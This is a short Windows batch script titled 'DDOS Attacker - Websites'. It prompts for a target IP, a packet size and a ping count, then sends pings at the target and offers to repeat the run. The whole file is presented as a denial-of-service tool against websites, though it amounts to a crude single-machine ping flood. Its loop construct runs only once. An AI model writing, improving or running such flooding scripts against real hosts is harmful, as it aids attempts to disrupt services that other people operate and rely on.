@echo off
title DDOS Attacker - Websites
color A

:attempt
set /p IP="Enter the IP of a web adress: "
set /p bytes="Enter the amount of bytes of data that will be sent: "
set /p num="Enter the amount of pings that will be performed: "
echo Checking if the IP is correct...
for /l %%x in (1,1,1) do (
    Ping %IP% -l %bytes% -n %num%
)
echo %IP% Pinged
echo.
set /p choice="Continue pinging?(Y/N)"
if /I "%choice%"=="Y" goto attempt
exit